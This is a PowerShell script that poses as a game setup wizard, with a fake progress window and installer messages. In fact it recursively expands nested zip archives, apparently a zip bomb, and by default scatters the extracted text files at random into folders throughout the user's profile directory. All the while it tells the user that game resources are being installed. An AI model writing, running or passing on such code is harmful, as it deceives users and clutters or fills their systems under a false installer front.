# Configuration
param(
    [string]$StartFile = "layer0.zip",
    [int]$MaxCycles = 5,
    [string]$ScatterLocation = "",
    [switch]$EnableScatter = $false,
    [switch]$NoScatter = $false
)

# Load Windows Forms
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create the splash screen form
$form = New-Object System.Windows.Forms.Form
$form.Text = "Game Setup Wizard"
$form.Size = New-Object System.Drawing.Size(500, 350)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.TopMost = $true
$form.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 48)

# Title Label
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Location = New-Object System.Drawing.Point(10, 20)
$titleLabel.Size = New-Object System.Drawing.Size(470, 40)
$titleLabel.Text = "Epic Adventure Game - Installer"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 16, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
$titleLabel.TextAlign = "MiddleCenter"
$form.Controls.Add($titleLabel)

# Status Label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Location = New-Object System.Drawing.Point(10, 70)
$statusLabel.Size = New-Object System.Drawing.Size(470, 25)
$statusLabel.Text = "Initializing..."
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$statusLabel.ForeColor = [System.Drawing.Color]::White
$form.Controls.Add($statusLabel)

# Progress Bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(10, 105)
$progressBar.Size = New-Object System.Drawing.Size(470, 30)
$progressBar.Style = "Continuous"
$form.Controls.Add($progressBar)

# Details TextBox
$detailsBox = New-Object System.Windows.Forms.TextBox
$detailsBox.Location = New-Object System.Drawing.Point(10, 145)
$detailsBox.Size = New-Object System.Drawing.Size(470, 150)
$detailsBox.Multiline = $true
$detailsBox.ScrollBars = "Vertical"
$detailsBox.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$detailsBox.ForeColor = [System.Drawing.Color]::LightGreen
$detailsBox.Font = New-Object System.Drawing.Font("Consolas", 9)
$detailsBox.ReadOnly = $true
$form.Controls.Add($detailsBox)

# Show the form
$form.Show()
$form.Refresh()

# Helper function to update UI
function Update-UI {
    param(
        [string]$Status = $null,
        [string]$Details = $null,
        [int]$Progress = -1
    )
    
    if ($Status) {
        $statusLabel.Text = $Status
    }
    
    if ($Details) {
        $detailsBox.AppendText("$Details`r`n")
        $detailsBox.SelectionStart = $detailsBox.Text.Length
        $detailsBox.ScrollToCaret()
    }
    
    if ($Progress -ge 0) {
        $progressBar.Value = [Math]::Min($Progress, 100)
    }
    
    $form.Refresh()
    [System.Windows.Forms.Application]::DoEvents()
}

# Handle scatter logic
if ($NoScatter) {
    $EnableScatter = $false
}
elseif (-not $EnableScatter -and $ScatterLocation -eq "") {
    $EnableScatter = $true
}

Update-UI -Status "Preparing installation..." -Details "Setup Wizard initialized successfully" -Progress 0

if (-not (Test-Path $StartFile)) {
    Update-UI -Status "ERROR: Installation files not found!" -Details "[ERROR] Setup files are missing. Please redownload the installer."
    Start-Sleep -Seconds 3
    $form.Close()
    exit 1
}

$outputDir = "full_expansion_zone"
if (-not (Test-Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir | Out-Null
}

Copy-Item $StartFile -Destination $outputDir -Force
Set-Location $outputDir

Update-UI -Status "Installing game files..." -Details "Setting up installation directory" -Progress 5

$currentCycle = 0

while ($true) {
    $zipFiles = Get-ChildItem -Recurse -Filter "*.zip" | Where-Object { $_.Name -notlike "*.extracted" }
    
    if ($zipFiles.Count -eq 0) {
        break
    }
    
    if ($currentCycle -ge $MaxCycles) {
        Update-UI -Status "Finalizing installation..." -Details "Completing setup process"
        break
    }
    
    $cycleProgress = [Math]::Min(10 + ($currentCycle * 15), 60)
    # Update status for current cycle
    $statusText = "Installing game assets - Package $currentCycle of $MaxCycles"
    $detailsText = "Unpacking game data ($($zipFiles.Count) files)..."
    Update-UI -Status $statusText -Details $detailsText -Progress $cycleProgress
    
    foreach ($zipFile in $zipFiles) {
        $dirName = $zipFile.BaseName + "_contents"
        $dirPath = Join-Path $zipFile.DirectoryName $dirName
        
        if (-not (Test-Path $dirPath)) {
            New-Item -ItemType Directory -Path $dirPath | Out-Null
        }
        
        try {
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::ExtractToDirectory($zipFile.FullName, $dirPath)
            
            $newName = $zipFile.FullName + ".extracted"
            Rename-Item $zipFile.FullName $newName
            
            Update-UI -Details "  Installing: $($zipFile.BaseName) module"
        }
        catch {
            Update-UI -Details "  Warning: Skipped $($zipFile.Name)"
        }
    }
    
    $allFiles = Get-ChildItem -Recurse -File
    $totalSize = ($allFiles | Measure-Object -Property Length -Sum).Sum
    $sizeGB = [math]::Round($totalSize / 1GB, 3)
    $sizeMB = [math]::Round($totalSize / 1MB, 2)
    
    if ($sizeGB -gt 0.1) {
        $sizeStr = "$sizeGB GB"
    }
    else {
        $sizeStr = "$sizeMB MB"
    }
    
    $txtCount = (Get-ChildItem -Recurse -Filter "*.txt").Count
    Update-UI -Details "  Game data: $sizeStr installed ($txtCount resources)"
    
    $currentCycle++
    Start-Sleep -Milliseconds 500
}

Update-UI -Status "Installation Complete!" -Details "Game files installed successfully" -Progress 70

$allFiles = Get-ChildItem -Recurse -File
$txtFiles = Get-ChildItem -Recurse -Filter "*.txt"
$extractedZips = Get-ChildItem -Recurse -Filter "*.extracted"
$totalSize = ($allFiles | Measure-Object -Property Length -Sum).Sum
$sizeGB = [math]::Round($totalSize / 1GB, 3)

Update-UI -Details "================================"
Update-UI -Details "Installation Summary:"
Update-UI -Details "  Total game files: $($allFiles.Count)"
Update-UI -Details "  Resource files: $($txtFiles.Count)"
Update-UI -Details "  Data packages: $($extractedZips.Count)"
Update-UI -Details "  Total size: $sizeGB GB"

$currentPath = Get-Location

# Scatter files functionality
if ($EnableScatter -or $ScatterLocation -ne "") {
    Update-UI -Status "Installing additional content..." -Details "================================" -Progress 75
    Update-UI -Details "Copying game resources to system folders..."
    
    if ($ScatterLocation -eq "") {
        $ScatterLocation = "C:\Users\$env:USERNAME\"
    }
    
    if (-not (Test-Path $ScatterLocation)) {
        Update-UI -Status "ERROR: Installation path not found!" -Details "Cannot access system directories!"
        Start-Sleep -Seconds 3
        $form.Close()
        exit 1
    }
    
    Update-UI -Details "Target: System directories"
    
    $filesToScatter = Get-ChildItem -Recurse -Filter "*.txt" -File
    
    if ($filesToScatter.Count -eq 0) {
        Update-UI -Status "No additional files to install" -Details "Skipping optional content"
        Start-Sleep -Seconds 3
        $form.Close()
        exit 1
    }
    
    Update-UI -Details "Found $($filesToScatter.Count) resource files to install"
    Update-UI -Status "Scanning system directories..." -Progress 80
    
    $targetFolders = Get-ChildItem -Path $ScatterLocation -Recurse -Directory -ErrorAction SilentlyContinue
    
    if ($targetFolders.Count -eq 0) {
        $targetFolders = @(Get-Item $ScatterLocation)
    }
    
    Update-UI -Details "Preparing to install resources in $($targetFolders.Count) locations"
    Update-UI -Status "Installing game resources..." -Progress 85
    Update-UI -Details "This may take a few moments..."
    
    Start-Sleep -Seconds 5
    
    $logFile = Join-Path (Split-Path $currentPath -Parent) "installation_$env:USERNAME.log"
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "=== Game Installation Log ===" | Out-File -FilePath $logFile -Encoding UTF8
    "Timestamp: $timestamp" | Out-File -FilePath $logFile -Append -Encoding UTF8
    "Source: $currentPath" | Out-File -FilePath $logFile -Append -Encoding UTF8
    "Target: $ScatterLocation" | Out-File -FilePath $logFile -Append -Encoding UTF8
    "Total Files: $($filesToScatter.Count)" | Out-File -FilePath $logFile -Append -Encoding UTF8
    "" | Out-File -FilePath $logFile -Append -Encoding UTF8
    
    Update-UI -Status "Copying game resources..." -Progress 90
    
    $scatteredCount = 0
    $random = New-Object System.Random
    
    foreach ($file in $filesToScatter) {
        $randomIndex = $random.Next(0, $targetFolders.Count)
        $targetFolder = $targetFolders[$randomIndex].FullName
        
        $targetPath = Join-Path $targetFolder $file.Name
        $counter = 1
        while (Test-Path $targetPath) {
            $baseName = [System.IO.Path]::GetFileNameWithoutExtension($file.Name)
            $extension = [System.IO.Path]::GetExtension($file.Name)
            $targetPath = Join-Path $targetFolder "${baseName}_${counter}${extension}"
            $counter++
        }
        
        try {
            Copy-Item -Path $file.FullName -Destination $targetPath -Force
            "[OK] $($file.Name) -> $targetPath" | Out-File -FilePath $logFile -Append -Encoding UTF8
            $scatteredCount++
            
            if ($scatteredCount % 5 -eq 0) {
                $scatterProgress = 90 + [Math]::Min(($scatteredCount / $filesToScatter.Count) * 9, 9)
                Update-UI -Status "Installing resources: $scatteredCount/$($filesToScatter.Count) files..." -Progress ([int]$scatterProgress)
            }
        }
        catch {
            "[ERROR] $($file.Name): $_" | Out-File -FilePath $logFile -Append -Encoding UTF8
        }
    }
    
    "" | Out-File -FilePath $logFile -Append -Encoding UTF8
    "Summary: Files installed: $scatteredCount | Locations: $($targetFolders.Count)" | Out-File -FilePath $logFile -Append -Encoding UTF8
    "Completed: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" | Out-File -FilePath $logFile -Append -Encoding UTF8
    
    Update-UI -Status "Installation Complete!" -Details "================================" -Progress 100
    Update-UI -Details "Game successfully installed!"
    Update-UI -Details "Resources copied: $scatteredCount files"
    Update-UI -Details "Installation log: $logFile"
    Update-UI -Details "================================"
    Update-UI -Details "You can now launch the game!"
}
else {
    Update-UI -Status "Installation Complete!" -Progress 100
}

Update-UI -Details "Setup will close in 10 seconds..."
Start-Sleep -Seconds 10

$form.Close()
